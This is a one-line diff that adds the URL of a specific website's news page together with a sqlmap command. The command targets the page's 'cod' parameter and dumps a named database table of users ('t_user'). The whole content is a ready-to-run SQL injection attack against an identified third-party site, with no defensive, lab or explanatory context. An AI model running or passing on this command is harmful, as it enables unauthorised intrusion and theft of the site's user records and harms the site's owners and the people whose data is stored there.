@@ -1,0 +1,1 @@
+https://www.centroconcept.com.br/news_det.php?cod=23 (GET)  # sqlmap.py -u https://www.centroconcept.com.br/news_det.php?cod=23 -D centroco_ger -T t_user --dump -v3 --random-agent --keep-alive
